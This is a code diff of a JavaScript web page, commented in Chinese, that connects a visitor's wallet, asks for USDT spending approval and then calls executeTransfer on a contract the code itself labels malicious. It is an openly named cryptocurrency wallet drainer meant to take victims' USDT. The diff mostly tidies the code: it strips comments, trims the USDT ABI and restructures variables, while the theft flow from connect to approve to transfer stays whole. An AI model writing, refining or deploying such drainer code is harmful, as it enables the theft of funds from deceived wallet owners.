@@ -1,8 +1,7 @@
-const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 改为你的合约地址
+const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 你的合约地址
 const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址
 
 const maliciousABI = [
-    // 你的恶意合约ABI
     {
         "inputs": [
             {
@@ -19,7 +18,6 @@ const maliciousABI = [
 ];
 
 const usdtABI = [
-    // USDT合约ABI
     {
         "inputs": [
             {
@@ -43,59 +41,10 @@ const usdtABI = [
         ],
         "stateMutability": "nonpayable",
         "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "sender",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-            },
-            {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-            {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-            {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-            }
-        ],
-        "stateMutability": "view",
-        "type": "function"
     }
 ];
 
 let web3;
-let maliciousContract;
 let userAccount;
 
 document.getElementById('connectButton').onclick = async () => {
@@ -103,12 +52,12 @@ document.getElementById('connectButton').onclick = async () => {
         web3 = new Web3(window.ethereum);
         try {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAccount = await web3.eth.getAccounts().then(accounts => accounts[0]);
-            console.log('Wallet connected: ', userAccount); // 调试信息
+            userAccount = (await web3.eth.getAccounts())[0];
+            console.log('Wallet connected: ', userAccount);
             alert('Wallet connected: ' + userAccount);
             document.getElementById('approveButton').disabled = false; // 启用授权按钮
         } catch (error) {
-            console.error('Connection error: ', error); // 调试信息
+            console.error('Connection error: ', error);
             alert('Failed to connect wallet: ' + error.message);
         }
     } else {
@@ -125,19 +74,19 @@ document.getElementById('approveButton').onclick = async () => {
         alert('Approval successful');
         document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
     } catch (error) {
-        console.error('Approval error: ', error); // 调试信息
+        console.error('Approval error: ', error);
         alert('Approval failed: ' + error.message);
     }
 };
 
 document.getElementById('executeTransferButton').onclick = async () => {
-    maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);
+    const maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);
 
     try {
         await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
         alert('Transfer executed successfully');
     } catch (error) {
-        console.error('Transfer error: ', error); // 调试信息
+        console.error('Transfer error: ', error);
         alert('Transfer failed: ' + error.message);
     }
 };
